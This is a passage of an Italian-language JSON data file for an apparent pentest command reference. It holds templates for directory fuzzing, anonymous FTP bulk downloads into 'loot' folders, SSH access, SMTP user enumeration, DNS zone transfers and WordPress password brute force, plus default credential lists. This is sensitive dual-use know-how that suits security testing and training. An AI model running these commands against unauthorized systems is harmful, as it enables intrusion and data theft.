        "template": "ffuf -u http://<ip>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php,.html,.txt,.bak,.conf,.xml,.aspx,.jsp",
        "description": "Aggiunge estensioni comuni: trova file (config, backup) oltre alle directory."
      },
      {
        "id": "recursion",
        "label": "Ricorsivo",
        "template": "ffuf -u http://<ip>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -recursion -recursion-depth 2",
        "description": "Scende nelle directory trovate (profondità 2). Wordlist piccola per non esplodere."
      },
      {
        "id": "path",
        "label": "Sotto un path",
        "template": "ffuf -u http://<ip>/<path>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt",
        "description": "Fuzz dentro un path già scoperto (es. `/admin/FUZZ`)."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — Web pentesting",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/index.html"
      },
      {
        "label": "SecLists",
        "url": "https://github.com/danielmiessler/SecLists"
      }
    ],
    "note": "# Opzioni\n- `-fc` filtra per codice di risposta, per esempio per nascondere i 404\n- `-fs` filtra per dimensione della risposta\n- le estensioni da cercare come `.php` o `.aspx` si scelgono in base alla tecnologia del sito\n# Prossimo passo\nVisita e analizza i percorsi trovati; se rispondono solo con un host specifico, passa al fuzzing dei virtual host."
  },
  {
    "id": "gobuster-dir",
    "name": "gobuster — directory",
    "category": "info-gathering",
    "subcategory": "active-recon",
    "group": "Directory Fuzzing",
    "description": "Alternativa a ffuf per la ricerca di file e directory. Comoda per confrontare i risultati quando ffuf produce falsi positivi.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "gobuster",
      "fuzzing",
      "web"
    ],
    "template": "gobuster dir -u http://<ip> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -o gobuster.txt",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "refs": [
      {
        "label": "gobuster — GitHub",
        "url": "https://github.com/OJ/gobuster"
      }
    ],
    "note": "# Opzioni\n- `-t` numero di processi paralleli\n- `-x` estensioni da cercare, per esempio `php,html,txt,bak`"
  },
  {
    "id": "add-hosts",
    "name": "/etc/hosts — aggiungi voci",
    "category": "info-gathering",
    "subcategory": "active-recon",
    "group": "Local Hosts",
    "description": "Aggiunge al file hosts locale l'abbinamento tra indirizzo IP e nome, per risolvere l'hostname senza passare da un DNS. È obbligatorio per raggiungere i virtual host basati sul nome e per seguire i reindirizzamenti verso un dominio.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [],
    "tags": [
      "etc-hosts",
      "setup"
    ],
    "template": "echo \"<ip> <domain>\" | sudo tee -a /etc/hosts",
    "params": [
      {
        "key": "ip",
        "label": "IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "domain",
        "label": "Hosts",
        "ctx": "domain",
        "placeholder": "corp.local dc01.corp.local"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Linux",
        "template": "echo \"<ip> <domain>\" | sudo tee -a /etc/hosts",
        "description": "Accoda la riga a `/etc/hosts` (serve sudo)."
      },
      {
        "id": "win-ps",
        "label": "Windows PS",
        "template": "Add-Content -Path \"C:\\Windows\\System32\\drivers\\etc\\hosts\" -Value \"<ip> <domain>\"",
        "description": "PowerShell come Administrator."
      },
      {
        "id": "win-cmd",
        "label": "Windows cmd",
        "template": "echo <ip> <domain> >> C:\\Windows\\System32\\drivers\\etc\\hosts",
        "description": "Prompt cmd come Administrator."
      }
    ],
    "refs": []
  },
  {
    "id": "ftp-anon",
    "name": "ftp — anonymous login",
    "category": "service-enum",
    "subcategory": "ftp",
    "group": "Anonymous Access",
    "description": "Prova l'accesso anonimo al server FTP: con l'utente anonymous e password vuota, o una email qualsiasi, molti server lasciano entrare. È sempre la prima cosa da tentare.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "ftp"
    ],
    "tags": [
      "ftp",
      "anonymous"
    ],
    "template": "ftp <ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "note": "# Opzioni\nDentro la sessione FTP:\n- `prompt off` disattiva la conferma a ogni file, poi `mget *` scarica tutta la cartella corrente\n- `binary` prima di scaricare file non testuali (archivi, immagini, database)\n- il client `ftp` non è ricorsivo: per l'intero albero usa lftp o `wget -m`\n# Credenziali di default\n`anonymous:anonymous` · `anonymous:` (una email qualsiasi) · `ftp:ftp` · `admin:admin`."
  },
  {
    "id": "ftp-lftp-access",
    "name": "lftp — login",
    "category": "service-enum",
    "subcategory": "ftp",
    "group": "Anonymous Access",
    "description": "Apre una sessione lftp interattiva per sfogliare il server prima di scaricare. Dentro la shell si usano `ls` e `cd`, poi `get` per un file, `mget *.conf` per i gruppi di file o `mirror` per il download ricorsivo.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "ftp"
    ],
    "tags": [
      "lftp",
      "ftp",
      "interattivo",
      "shell"
    ],
    "template": "lftp -u anonymous, <ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "Utente",
        "placeholder": "ftpuser",
        "ctx": "user"
      },
      {
        "key": "pass",
        "label": "Password",
        "placeholder": "password"
      }
    ],
    "variants": [
      {
        "id": "anon",
        "label": "Accesso anonimo",
        "template": "lftp -u anonymous, <ip>",
        "description": "Apre una sessione lftp interattiva in anonimo. Dentro usi `ls`, `cd`, `get`, `mget` e `mirror` (ricorsivo)."
      },
      {
        "id": "creds",
        "label": "Accesso con cred",
        "template": "lftp -u <user>,<pass> <ip>",
        "description": "Sessione lftp interattiva autenticata. Stessi comandi interni; `mirror <dir>.` per scaricare ricorsivamente."
      }
    ],
    "refs": [
      {
        "label": "lftp — Kali Tools",
        "url": "https://www.kali.org/tools/lftp/"
      }
    ],
    "note": "# Opzioni\n- `-u anonymous,` login anonimo con password vuota (attenzione alla virgola finale)\n- `-u <user>,<pass>` login autenticato\n# Prossimo passo\nPer scaricare tutto senza entrare nella shell usa lftp in modalita download."
  },
  {
    "id": "nmap-ftp",
    "name": "nmap — FTP scripts",
    "category": "service-enum",
    "subcategory": "ftp",
    "group": "Anonymous Access",
    "description": "Esegue in una sola scansione gli script di nmap per FTP: controlla l'accesso anonimo, il bounce, il banner del server e la backdoor nota di vsftpd.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "ftp"
    ],
    "tags": [
      "nmap",
      "ftp"
    ],
    "template": "nmap -p21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor <ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "ftp-lftp",
    "name": "lftp — download FTP",
    "category": "service-enum",
    "subcategory": "ftp",
    "group": "Pillaging",
    "description": "Scarica in blocco il contenuto del server FTP ricreando in locale l'albero remoto. Più affidabile di wget sulle reti con NAT e supporta i trasferimenti in parallelo.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "ftp"
    ],
    "tags": [
      "lftp",
      "ftp",
      "download",
      "mirror"
    ],
    "template": "lftp -u anonymous, <ip> -e \"mirror --verbose --parallel=4 / ./ftp_loot; bye\"",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "rpath",
        "label": "Path remoto",
        "placeholder": "/uploads"
      },
      {
        "key": "user",
        "label": "Utente",
        "placeholder": "ftpuser",
        "ctx": "user"
      },
      {
        "key": "pass",
        "label": "Password",
        "placeholder": "password"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Tutto",
        "template": "lftp -u anonymous, <ip> -e \"mirror --verbose --parallel=4 / ./ftp_loot; bye\"",
        "description": "Scarica ricorsivamente tutto il server (`/`) dentro `./ftp_loot`."
      },
      {
        "id": "glob",
        "label": "Solo per estensione",
        "template": "lftp -u anonymous, <ip> -e \"mirror --include-glob '*.conf' --include-glob '*.txt' / ./ftp_loot; bye\"",
        "description": "Solo i file che matchano il glob (`*.conf`, `*.txt`…): utile quando il server è grande."
      },
      {
        "id": "dir",
        "label": "Solo una cartella",
        "template": "lftp -u anonymous, <ip> -e \"mirror <rpath> ./ftp_loot; bye\"",
        "description": "Scarica solo la directory remota indicata in `<rpath>`."
      },
      {
        "id": "single",
        "label": "File singolo",
        "template": "lftp -u anonymous, <ip> -e \"get <rpath>; bye\"",
        "description": "Prende un solo file: `<rpath>` = path completo, es. `/backup/db.sql`."
      },
      {
        "id": "creds",
        "label": "Mirror con cred",
        "template": "lftp -u <user>,<pass> <ip> -e \"mirror / ./ftp_loot; bye\"",
        "description": "Come il mirror completo ma con login autenticato invece che anonimo."
      }
    ],
    "refs": [
      {
        "label": "lftp — Kali Tools",
        "url": "https://www.kali.org/tools/lftp/"
      }
    ],
    "note": "# Opzioni\n- `mirror` scarica ricorsivamente una directory\n- `--include-glob` e `--exclude-glob` filtrano quali file prendere\n- `--parallel=N` esegue N trasferimenti insieme\n# Prossimo passo\nPer sfogliare il server a mano prima di scaricare usa lftp in modalita login."
  },
  {
    "id": "ftp-wget",
    "name": "wget — download FTP",
    "category": "service-enum",
    "subcategory": "ftp",
    "group": "Pillaging",
    "description": "Scarica ricorsivamente tutti i file del server via FTP anonimo, ricreandone la struttura in locale.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "ftp"
    ],
    "tags": [
      "wget",
      "ftp",
      "download"
    ],
    "template": "wget -m --no-passive-ftp ftp://anonymous:@<ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "note": "# Opzioni\n`--no-passive-ftp` forza la modalita attiva, utile quando la modalita passiva non funziona dietro NAT."
  },
  {
    "id": "ssh-banner",
    "name": "nc — SSH banner grab",
    "category": "service-enum",
    "subcategory": "ssh",
    "group": "Fingerprinting",
    "description": "Legge il banner del servizio SSH. La versione annunciata spesso rivela il sistema operativo è il livello di aggiornamento del server.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "ssh"
    ],
    "tags": [
      "nc",
      "ssh",
      "banner"
    ],
    "template": "nc -nv <ip> 22",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "note": "# Prossimo passo\nCerca vulnerabilità note per la versione mostrata nel banner."
  },
  {
    "id": "ssh-algos",
    "name": "nmap — SSH algos & hostkey",
    "category": "service-enum",
    "subcategory": "ssh",
    "group": "Fingerprinting",
    "description": "Enumera gli algoritmi di scambio chiavi e i cifrari supportati, oltre alla chiave pubblica del server. Algoritmi vecchi o deboli indicano un server datato.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "ssh"
    ],
    "tags": [
      "nmap",
      "ssh"
    ],
    "template": "nmap -p22 --script ssh2-enum-algos,ssh-hostkey <ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "ssh-auth-methods",
    "name": "ssh — list auth methods",
    "category": "service-enum",
    "subcategory": "ssh",
    "group": "Auth Discovery",
    "description": "Mostra quali metodi di autenticazione accetta il server: password, chiave pubblica o keyboard-interactive. Dice su quale metodo conviene concentrare i tentativi di accesso.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "ssh"
    ],
    "tags": [
      "ssh",
      "auth"
    ],
    "template": "ssh -o PreferredAuthentications=none -o ConnectTimeout=5 <user>@<ip>",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "root"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "ssh-connect",
    "name": "ssh — connect",
    "category": "service-enum",
    "subcategory": "ssh",
    "group": "Access",
    "description": "Si connette al server SSH con le credenziali trovate, usando una password o una chiave privata.",
    "note": "# Opzioni\n- `-i <key>` login con chiave privata (prima dai `chmod 600` alla chiave)\n- `-p <port>` porta non standard\n- `-o StrictHostKeyChecking=no` salta la conferma della host key\n# Credenziali di default\nDipendono dall'apparato, ma vale la pena provarle: `root:root` · `root:toor` · `admin:admin` · `root:calvin` (Dell iDRAC) · `pi:raspberry` (Raspberry Pi).\n# Errori comuni\nSu un server datato il client moderno rifiuta gli algoritmi legacy: vanno riabilitati a mano con le opzioni dedicate.",
    "platform": "cross-platform",
    "requires": [
      "password"
    ],
    "protocols": [
      "ssh"
    ],
    "tags": [
      "ssh",
      "connect",
      "login"
    ],
    "template": "ssh <user>@<ip>",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "root"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "key",
        "label": "Chiave privata",
        "placeholder": "id_rsa"
      },
      {
        "key": "port",
        "label": "Porta",
        "placeholder": "22"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Password",
        "template": "ssh <user>@<ip>",
        "description": "Login con password (te la chiede dopo la connessione)."
      },
      {
        "id": "key",
        "label": "Chiave privata",
        "template": "ssh -i <key> <user>@<ip>",
        "description": "Login con chiave privata. La chiave deve avere permessi `600` (`chmod 600 <key>`)."
      },
      {
        "id": "port",
        "label": "Porta custom",
        "template": "ssh -p <port> <user>@<ip>",
        "description": "Quando SSH non è sulla porta 22."
      },
      {
        "id": "legacy",
        "label": "Server vecchio",
        "template": "ssh -o HostKeyAlgorithms=+ssh-rsa -o KexAlgorithms=+diffie-hellman-group14-sha1 -o PubkeyAcceptedAlgorithms=+ssh-rsa <user>@<ip>",
        "description": "Server SSH datato: riabilita gli algoritmi che OpenSSH moderno disabilita. Sintomi: `no matching host key type` o `no matching key exchange method`."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — Pentesting SSH",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ssh.html"
      }
    ]
  },
  {
    "id": "ssh-scp",
    "name": "scp — copy over SSH",
    "category": "service-enum",
    "subcategory": "ssh",
    "group": "File Transfer",
    "description": "Copia file attraverso il canale cifrato di SSH. La direzione del trasferimento dipende da quale lato porta la forma `<user>@<ip>:`, se la sorgente o la destinazione.",
    "platform": "cross-platform",
    "requires": [
      "password"
    ],
    "protocols": [
      "ssh"
    ],
    "tags": [
      "scp",
      "ssh",
      "file-transfer"
    ],
    "template": "scp <user>@<ip>:<rpath> ./",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "root"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "rpath",
        "label": "Path remoto",
        "placeholder": "/home/user/file"
      },
      {
        "key": "lpath",
        "label": "Path locale",
        "placeholder": "./file"
      },
      {
        "key": "key",
        "label": "Chiave privata",
        "placeholder": "id_rsa"
      }
    ],
    "variants": [
      {
        "id": "download",
        "label": "Scarica",
        "template": "scp <user>@<ip>:<rpath> ./",
        "description": "Prende un file dal target e lo salva nella cartella corrente."
      },
      {
        "id": "upload",
        "label": "Carica",
        "template": "scp <lpath> <user>@<ip>:<rpath>",
        "description": "Manda un file locale sul target."
      },
      {
        "id": "recursive",
        "label": "Cartella",
        "template": "scp -r <user>@<ip>:<rpath> ./loot",
        "description": "Scarica ricorsivamente un'intera directory remota."
      },
      {
        "id": "key",
        "label": "Con chiave",
        "template": "scp -i <key> <user>@<ip>:<rpath> ./",
        "description": "Come download ma autenticandosi con chiave privata."
      }
    ],
    "refs": [
      {
        "label": "scp — man page",
        "url": "https://man.openbsd.org/scp.1"
      }
    ],
    "note": "# Opzioni\n- `-r` ricorsivo, per intere cartelle\n- `-P <port>` porta non standard (P maiuscola, al contrario di ssh)\n- `-i <key>` usa una chiave privata\n# Errori comuni\nSe scp non è disponibile, scarica un file con `ssh <user>@<ip> \"cat file\" > file`, oppure una cartella comprimendola al volo con tar attraverso ssh."
  },
  {
    "id": "ssh-sftp",
    "name": "sftp — interactive transfer",
    "category": "service-enum",
    "subcategory": "ssh",
    "group": "File Transfer",
    "description": "Trasferimento interattivo su SSH, comodo per navigare le cartelle e prendere più file in una sessione.",
    "platform": "cross-platform",
    "requires": [
      "password"
    ],
    "protocols": [
      "ssh"
    ],
    "tags": [
      "sftp",
      "ssh",
      "file-transfer"
    ],
    "template": "sftp <user>@<ip>",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "root"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "rpath",
        "label": "Path remoto",
        "placeholder": "/home/user/file"
      },
      {
        "key": "key",
        "label": "Chiave privata",
        "placeholder": "id_rsa"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Interattivo",
        "template": "sftp <user>@<ip>",
        "description": "Apre la sessione. Poi `get`/`put`, `mget *.conf`, `get -r <dir>` per il ricorsivo."
      },
      {
        "id": "get",
        "label": "Scarica un file",
        "template": "sftp <user>@<ip>:<rpath> ./",
        "description": "Get diretto di un file senza entrare nella shell."
      },
      {
        "id": "key",
        "label": "Con chiave",
        "template": "sftp -i <key> <user>@<ip>",
        "description": "Sessione autenticata con chiave privata."
      }
    ],
    "refs": [
      {
        "label": "sftp — man page",
        "url": "https://man.openbsd.org/sftp.1"
      }
    ],
    "note": "# Opzioni\nComandi dentro la shell: `ls` e `cd` (lato remoto), `lls` e `lcd` (lato locale), `get` e `put`, `mget` e `mput` per i gruppi di file, `get -r <dir>` per il ricorsivo."
  },
  {
    "id": "ssh-rsync",
    "name": "rsync — sync over SSH",
    "category": "service-enum",
    "subcategory": "ssh",
    "group": "File Transfer",
    "description": "Sincronizza cartelle attraverso SSH in modo veloce e incrementale. Ideale per file grandi o trasferimenti interrotti, perché riprende da dove si era fermato invece di ricominciare.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ssh"
    ],
    "tags": [
      "rsync",
      "ssh",
      "file-transfer"
    ],
    "template": "rsync -avz -e ssh <user>@<ip>:<rpath> ./loot",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "root"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "rpath",
        "label": "Path remoto",
        "placeholder": "/var/www/"
      },
      {
        "key": "lpath",
        "label": "Path locale",
        "placeholder": "./loot"
      }
    ],
    "variants": [
      {
        "id": "download",
        "label": "Scarica",
        "template": "rsync -avz -e ssh <user>@<ip>:<rpath> ./loot",
        "description": "Sincronizza una cartella remota in locale."
      },
      {
        "id": "upload",
        "label": "Carica",
        "template": "rsync -avz -e ssh <lpath> <user>@<ip>:<rpath>",
        "description": "Sincronizza una cartella locale sul target."
      }
    ],
    "refs": [
      {
        "label": "rsync — man page",
        "url": "https://linux.die.net/man/1/rsync"
      }
    ],
    "note": "# Opzioni\n- `-a` modo archivio: ricorsivo, con permessi e date\n- `-v` output dettagliato\n- `-z` comprime i dati durante il trasferimento\n- `-e ssh` usa SSH come canale di trasporto"
  },
  {
    "id": "smtp-userenum",
    "name": "smtp-user-enum — VRFY/RCPT",
    "category": "service-enum",
    "subcategory": "smtp",
    "group": "User Enumeration",
    "description": "Enumera gli utenti validi del server di posta tramite i comandi VRFY, EXPN e RCPT TO. Il metodo si sceglie in base a quale dei tre il server lascia aperto.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "smtp"
    ],
    "tags": [
      "smtp",
      "user-enum"
    ],
    "template": "smtp-user-enum -M VRFY -U <userlist> -t <ip>",
    "params": [
      {
        "key": "userlist",
        "label": "Userlist",
        "placeholder": "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "VRFY",
        "template": "smtp-user-enum -M VRFY -U <userlist> -t <ip>",
        "description": "Metodo VRFY: chiede al server se un utente esiste."
      },
      {
        "id": "rcpt",
        "label": "RCPT",
        "template": "smtp-user-enum -M RCPT -U <userlist> -D <domain> -t <ip>",
        "description": "Metodo `RCPT TO`: più affidabile quando `VRFY` è disabilitato. `-D` imposta il dominio."
      },
      {
        "id": "expn",
        "label": "EXPN",
        "template": "smtp-user-enum -M EXPN -U <userlist> -t <ip>",
        "description": "Metodo EXPN: espande alias e mailing list."
      }
    ],
    "note": "# Output atteso\nLa lista di utenti validi che ne esce alimenta il password spray e gli attacchi di accesso successivi."
  },
  {
    "id": "nmap-smtp",
    "name": "nmap — SMTP scripts",
    "category": "service-enum",
    "subcategory": "smtp",
    "group": "User Enumeration",
    "description": "Esegue gli script di nmap per SMTP: comandi supportati dal server, enumerazione utenti, verifica di open relay e una vulnerabilità nota del server Exim.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "smtp"
    ],
    "tags": [
      "nmap",
      "smtp"
    ],
    "template": "nmap -p25 --script smtp-commands,smtp-enum-users,smtp-open-relay,smtp-vuln-cve2010-4344 <ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "swaks",
    "name": "swaks — invio mail / open relay",
    "category": "service-enum",
    "subcategory": "smtp",
    "group": "Open Relay",
    "description": "Invia una email di prova attraverso il server. Serve a verificare se è un open relay e a innescare le email di verifica di alcune applicazioni.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "smtp"
    ],
    "tags": [
      "swaks",
      "smtp",
      "open-relay"
    ],
    "template": "swaks --to user@<domain> --from test@test.com --server <ip> --body \"test\"",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "refs": [
      {
        "label": "HackTricks — 25 Pentesting SMTP",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smtp/index.html"
      }
    ],
    "note": "# Output atteso\nSe l'email raggiunge un dominio esterno che il server non gestisce, l'open relay e confermato: può essere sfruttato per spam o per falsificare il mittente."
  },
  {
    "id": "dns-query",
    "name": "dig — query record",
    "category": "service-enum",
    "subcategory": "dns-svc",
    "group": "Records",
    "description": "Interroga record DNS specifici del dominio. I record NS, MX e TXT rivelano l'infrastruttura e la posta; i record SRV individuano i servizi di dominio, per esempio `_ldap._tcp` che punta ai Domain Controller.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "dns"
    ],
    "tags": [
      "dig",
      "dns"
    ],
    "template": "dig A <domain> @<ip>",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "ip",
        "label": "DNS server",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "A",
        "template": "dig A <domain> @<ip>",
        "description": "Record A (IPv4)."
      },
      {
        "id": "any",
        "label": "ANY",
        "template": "dig ANY <domain> @<ip>",
        "description": "Tutti i record (spesso filtrato sui resolver moderni)."
      },
      {
        "id": "mx",
        "label": "MX/TXT",
        "template": "dig MX <domain> @<ip>; dig TXT <domain> @<ip>",
        "description": "Mail server e record TXT (SPF, verifiche di dominio, a volte info leak)."
      },
      {
        "id": "ns",
        "label": "NS",
        "template": "dig NS <domain> @<ip>",
        "description": "Name server autoritativi del dominio."
      },
      {
        "id": "srv",
        "label": "SRV (AD)",
        "template": "dig SRV _ldap._tcp.<domain> @<ip>",
        "description": "Individua i Domain Controller via record SRV LDAP."
      }
    ]
  },
  {
    "id": "dnsrecon",
    "name": "dnsrecon — enum & reverse",
    "category": "service-enum",
    "subcategory": "dns-svc",
    "group": "Records",
    "description": "Enumerazione DNS completa: tenta il trasferimento di zona e interroga i record più comuni. Con `-r` esegue la risoluzione inversa di un intervallo di indirizzi per mappare gli host interni.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "dns"
    ],
    "tags": [
      "dnsrecon",
      "dns"
    ],
    "template": "dnsrecon -d <domain> -n <ip>",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "ip",
        "label": "DNS server",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "subnet",
        "label": "Subnet",
        "placeholder": "10.10.10.0"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Standard",
        "template": "dnsrecon -d <domain> -n <ip>",
        "description": "Enum standard del dominio (AXFR + record comuni)."
      },
      {
        "id": "reverse",
        "label": "Reverse range",
        "template": "dnsrecon -r <subnet>/24 -n <ip>",
        "description": "Reverse lookup di un range per scoprire host e nomi interni."
      }
    ]
  },
  {
    "id": "dns-svc-brute",
    "name": "dnsenum — subdomain brute",
    "category": "service-enum",
    "subcategory": "dns-svc",
    "group": "Records",
    "description": "Scopre host e sottodomini provando a tentativi i nomi di una lista contro il DNS del target. Utile quando il trasferimento di zona viene negato.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "dns"
    ],
    "tags": [
      "dnsenum",
      "dns",
      "brute"
    ],
    "template": "dnsenum --dnsserver <ip> -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt <domain>",
    "params": [
      {
        "key": "ip",
        "label": "DNS server",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      }
    ]
  },
  {
    "id": "dns-axfr",
    "name": "dig — zone transfer (AXFR)",
    "category": "service-enum",
    "subcategory": "dns-svc",
    "group": "Zone Transfer",
    "description": "Tenta il trasferimento di zona verso i name server del dominio. Se un DNS secondario e configurato male, restituisce tutti i record della zona in un colpo solo: host interni, sottodomini e servizi.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "dns"
    ],
    "tags": [
      "dig",
      "dns",
      "axfr"
    ],
    "template": "dig axfr <domain> @<ip>",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "ip",
        "label": "DNS server",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "refs": [
      {
        "label": "HackTricks — 53 Pentesting DNS",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-dns.html"
      }
    ],
    "note": "# Output atteso\nUn trasferimento riuscito è un risultato prezioso: l'elenco completo di host e indirizzi interni senza doverli indovinare. Spesso fallisce sul server primario ma riesce su un secondario, quindi vanno provati tutti.\n# Errori comuni\nIl rifiuto del trasferimento è la norma sui server configurati bene: non insistere e passare al bruteforce dei sottodomini.",
    "variants": [
      {
        "id": "default",
        "label": "dig",
        "template": "dig axfr <domain> @<ip>",
        "description": "Zone transfer con dig verso il nameserver indicato."
      },
      {
        "id": "dnsrecon",
        "label": "dnsrecon",
        "template": "dnsrecon -d <domain> -n <ip> -t axfr",
        "description": "Prova l AXFR automaticamente su tutti i nameserver trovati."
      },
      {
        "id": "fierce",
        "label": "fierce",
        "template": "fierce --domain <domain> --dns-servers <ip>",
        "description": "Scopre i nameserver e tenta il trasferimento di zona."
      }
    ]
  },
  {
    "id": "wpscan",
    "name": "wpscan — WordPress",
    "category": "service-enum",
    "subcategory": "web-apps",
    "group": "CMS",
    "description": "Scanner WordPress: enumera plugin, temi e utenti e, con `--api-token`, mostra i CVE noti. In modalità brute force `-U` e `-P` agiscono contro `wp-login`.",
    "note": "# Credenziali di default\nWordPress non ha un default fisso, ma dopo aver enumerato gli utenti prova `admin:admin` · `admin:password` · utente uguale alla password. Poi brute mirato con `--usernames`/`--passwords`.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "wpscan",
      "wordpress",
      "cms"
    ],
    "template": "wpscan --url http://<ip> --enumerate ap,at,u --api-token <token>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "token",
        "label": "API token",
        "placeholder": "WPScan API token"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Enumera",
        "template": "wpscan --url http://<ip> --enumerate ap,at,u --api-token <token>",
        "description": "Enumera tutti i plugin (ap), temi (at) e utenti (u)."
      },
      {
        "id": "brute",
        "label": "Brute login",
        "template": "wpscan --url http://<ip> -U users.txt -P /usr/share/wordlists/rockyou.txt",
        "description": "Bruteforce delle password via `XML-RPC`/`wp-login` con la lista utenti trovata."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — WordPress",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/wordpress.html"
      }
    ]
  },
  {
    "id": "droopescan",
    "name": "droopescan — Drupal/Joomla",
    "category": "service-enum",
    "subcategory": "web-apps",
    "group": "CMS",
